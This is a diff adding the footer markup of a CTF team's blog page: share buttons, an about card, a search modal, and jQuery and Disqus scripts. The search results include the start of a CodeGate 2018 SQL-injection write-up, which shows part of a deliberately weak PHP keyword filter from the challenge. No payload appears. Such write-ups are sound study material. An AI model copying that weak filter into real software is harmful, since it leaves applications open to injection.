+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/" data-tooltip="Welcome to Team Eur3kA site">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://Team-Eur3kA.github.io/1/01/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://Team-Eur3kA.github.io/1/01/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://Team-Eur3kA.github.io/1/01/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2FTeam-Eur3kA.github.io%2F1%2F01%2F">
+          <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2FTeam-Eur3kA.github.io%2F1%2F01%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2FTeam-Eur3kA.github.io%2F1%2F01%2F">
+          <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://farscapedevelopment.files.wordpress.com/2012/07/eureka.gif" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Team-Eur3kA</h4>
+    
+      <div id="about-card-bio">CTF Security Team Eur3kA deriving from former united team FFF-PKyou which consists of members from multiple united team FFF and Peking University team PKyou</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Security Team
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        China
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/">
+                <h3 class="media-heading">CodeGate 2018 7amebox1 Writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/2018/02/welcome-to-team-eur3ka-site/">
+                <h3 class="media-heading">Welcome to Team Eur3kA site</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Feb 2, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Welcome a lot to visit Team Eur3kA offitial site.
+</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://Team-Eur3kA.github.io/1/01/">
+                <h3 class="media-heading"></h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 0001
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">codegate 2018 Web writeup Simple CMS Reference: write up from 0ops
+This challenge is a sql injection challenge. In this challenge, we can get the source code of the CMS. First we can se that there is a waf for the whole cms:
+waf.php
+&lt;?php if(!defined('simple_cms')) exit(); $method = $_SERVER['REQUEST_METHOD']; if($method !== 'GET' &amp;&amp; $method !== 'POST'){ exit('are you hacker?'); } $filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into'); function escape_str($array) { if(is_array($array)) { foreach($array as $key =&gt; $value) { if(is_array($value)) { $array[$key] = escape_str($value); } else { $array[$key] = filter($value); } } } else { $array = filter($array); } return $array; } function filter($str){ global $filter_str; foreach ($filter_str as $value) { if(stripos($str, $value) !</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         3 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://Team-Eur3kA.github.io/images/cover.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Team-Eur3kA.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/Team-Eur3kA.github.io\/1\/01\/';
+          
+            this.page.identifier = '\/1\/01\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'hugo-tranquilpeak-theme';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
